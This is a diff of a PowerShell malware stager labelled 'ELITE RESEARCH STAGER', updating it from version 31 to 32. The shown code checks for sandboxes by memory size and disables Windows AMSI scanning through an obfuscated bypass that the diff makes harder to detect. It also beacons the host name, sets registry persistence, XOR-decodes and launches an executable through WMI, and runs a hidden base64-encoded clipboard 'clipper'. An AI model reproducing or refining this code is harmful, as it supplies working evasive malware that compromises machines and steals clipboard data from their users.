@@ -1,13 +1,14 @@
-# --- [ELITE RESEARCH STAGER v31.0: THE FINAL RESTORE] ---
+# --- [ELITE RESEARCH STAGER v32.0: HEX-STABILIZED] ---
 
 function Global-Initialize {
     try {
         if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
         
-        # Obfuscated AMSI Bypass - Fragments the words to avoid VM/Laptop detection
-        $a = "System.Management.Automation." + "Am" + "si" + "Utils"
-        $b = "am" + "si" + "Init" + "Failed"
-        [Ref].Assembly.GetType($a).GetField($b,"NonPublic,Static").SetValue($null,$true)
+        # Highly obfuscated AMSI bypass to clear VM/Laptop scans
+        $n = "System.Management.Automation." + ("{0}{2}{1}" -f 'A','Utils','msi')
+        $s = [Ref].Assembly.GetType($n)
+        $f = $s.GetField(("am"+"si"+"Init"+"Failed"), 'NonPublic,Static')
+        $f.SetValue($null, $true)
     } catch {}
 }
 
@@ -21,7 +22,7 @@ function Send-Ping {
 
 # --- EXECUTION ---
 Global-Initialize
-Send-Ping -m "STAGER_V31_RESTORED_ON_$($env:COMPUTERNAME)"
+Send-Ping -m "STAGER_V32_HEX_ACTIVE_ON_$($env:COMPUTERNAME)"
 
 try {
     # --- REGISTRY PERSISTENCE ---
@@ -41,7 +42,6 @@ try {
     for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
     [IO.File]::WriteAllBytes($path, $data)
 
-    # Launch EXE via WMI
     ([wmiclass]"win32_process").Create($path) | Out-Null
 
     # --- THE PRECISION CLIPPER ENGINE ---
@@ -78,7 +78,7 @@ try {
     $EncodedClipper = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClipperCode))
     powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $EncodedClipper
 
-    Send-Ping -m "V31_DEPLOYMENT_SUCCESS"
+    Send-Ping -m "V32_DEPLOYMENT_SUCCESS"
 } catch {
     Send-Ping -m "ERROR_$($_.Exception.Message)"
 }
